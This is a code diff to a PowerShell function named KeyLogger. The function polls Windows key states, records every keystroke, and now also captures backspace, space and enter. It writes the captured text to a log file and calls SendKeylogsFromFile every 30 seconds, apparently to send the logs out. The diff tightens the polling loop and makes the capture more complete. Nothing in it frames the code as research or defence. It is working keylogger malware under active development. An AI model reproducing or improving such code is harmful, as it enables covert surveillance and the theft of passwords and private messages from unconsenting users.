@@ -64,9 +64,9 @@ function KeyLogger {
     $sendTime = (Get-Date).AddSeconds(30)
 
     while ($true) {
-        Start-Sleep -Milliseconds 50
+        Start-Sleep -Milliseconds 10
 
-        for ($ascii = 9; $ascii -le 254; $ascii++) {
+        for ($ascii = 8; $ascii -le 254; $ascii++) {
             $keystate = $API::GetAsyncKeyState($ascii)
 
             if ($keystate -eq -32767) {
@@ -78,18 +78,29 @@ function KeyLogger {
                 $hideKeyboardState = $API::GetKeyboardState($keyboardState)
                 $loggedchar = New-Object -TypeName System.Text.StringBuilder
 
-                if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
-                    $buffer += $loggedchar
+                switch ($ascii) {
+                    8   { $buffer += "[BACKSPACE]" }
+                    32  { $buffer += " " }
+                    13  { $buffer += "[ENTER]" }
+                    default {
+                        if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
+                            $buffer += $loggedchar
+                        }
+                    }
+                }
+
+                if ($ascii -eq 13 -or $ascii -eq 32 -or $ascii -eq 8) {
+                    LogKeystrokesToFile -Content $buffer.Trim()
+                    $buffer = ""
                 }
             }
         }
-        
-        if ($buffer -match '\s+$') {
-            LogKeystrokesToFile -Content $buffer.Trim()
-            $buffer = ""  
-        }
 
         if ((Get-Date) -ge $sendTime) {
+            if ($buffer.Length -gt 0) {
+                LogKeystrokesToFile -Content $buffer.Trim()
+                $buffer = ""
+            }
             SendKeylogsFromFile
             $sendTime = (Get-Date).AddSeconds(30)
         }
